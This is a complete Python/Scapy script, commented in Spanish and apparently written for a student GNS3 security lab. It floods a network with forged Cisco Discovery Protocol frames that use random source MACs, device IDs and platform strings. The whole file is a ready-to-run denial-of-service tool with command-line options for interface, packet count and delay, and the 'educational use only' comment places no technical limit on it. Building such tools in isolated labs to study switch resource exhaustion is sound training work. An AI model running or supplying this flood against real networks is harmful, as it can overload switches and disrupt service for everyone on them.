#!/usr/bin/env python3
# CDP Flood Attack - Laboratorio de Seguridad de Redes
# Autor: Estudiante de Ciberseguridad
# Entorno: GNS3 (Ambiente Controlado)
# ADVERTENCIA: Uso exclusivamente educativo en entornos controlados.

from scapy.all import *
from scapy.contrib.cdp import *
import random, time, argparse, sys, os


def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])


def cdp_flood(interface='eth0', count=500, delay=0.0):
    print("=" * 60)
    print("  CDP FLOOD ATTACK - Laboratorio GNS3")
    print(f"  Interfaz: {interface} | Paquetes: {count}")
    print("=" * 60)
    sent = 0
    start_time = time.time()
    try:
        for i in range(count):
            mac_src = random_mac()
            device_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
            platform = random.choice(['cisco WS-C3750', 'cisco WS-C2960', 'cisco C9200'])
            pkt = (
                Ether(src=mac_src, dst='01:00:0c:cc:cc:cc') /
                LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
                SNAP(OUI=0x00000c, code=0x2000) /
                CDPv2_HDR() /
                CDPMsgDeviceID(val=device_id) /
                CDPMsgPortID(iface='GigabitEthernet0/0') /
                CDPMsgCapabilities() /
                CDPMsgSoftwareVersion(val='Cisco IOS Version 15.2') /
                CDPMsgPlatform(val=platform)
            )
            sendp(pkt, iface=interface, verbose=False)
            sent += 1
            if sent % 100 == 0:
                elapsed = time.time() - start_time
                print(f"  [+] {sent}/{count} | {sent/elapsed:.1f} pkt/s")
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[!] Interrumpido.")
    print(f"[+] Total enviados: {sent}")


if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit("[-] Requiere root.")
    parser = argparse.ArgumentParser(description='CDP Flood - GNS3')
    parser.add_argument('-i', '--interface', default='eth0')
    parser.add_argument('-c', '--count', type=int, default=500)
    parser.add_argument('-d', '--delay', type=float, default=0.0)
    args = parser.parse_args()
    cdp_flood(args.interface, args.count, args.delay)
